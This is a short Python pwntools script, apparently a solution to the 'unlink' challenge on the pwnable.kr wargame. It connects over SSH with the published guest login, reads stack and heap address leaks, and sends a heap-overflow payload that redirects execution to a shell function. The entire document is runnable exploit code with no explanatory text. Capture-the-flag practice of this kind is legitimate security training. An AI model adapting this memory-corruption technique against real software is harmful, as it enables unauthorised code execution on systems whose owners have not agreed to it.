#!/usr/bin/python3
from pwn import *

NAME = 'unlink'
BUFFER_SIZE = 0x10
RETURN_ADDRESS_OFFSET = -24 - 0x4
SHELL_ADDRESS = 0x080484eb
session = ssh(host='pwnable.kr', user=NAME, port=2222, password='guest')
io = session.process(f'./{NAME}')
gdb.attach(io, gdbscript='')
input()
leaks = io.recvrepeat(1).split(b'\n')
stack_leak = int(leaks[0].split(b':')[1].decode(), 16)
heap_leak = int(leaks[1].split(b':')[1].decode(), 16)
payload = b'a' * BUFFER_SIZE
return_address = stack_leak + RETURN_ADDRESS_OFFSET

payload += bytes.fromhex(hex(return_address)[2:].rjust(8, '0'))[::-1]
payload += bytes.fromhex(hex(SHELL_ADDRESS)[2:].rjust(8, '0'))[::-1]
io.sendline(payload)
print(io.recvrepeat(1))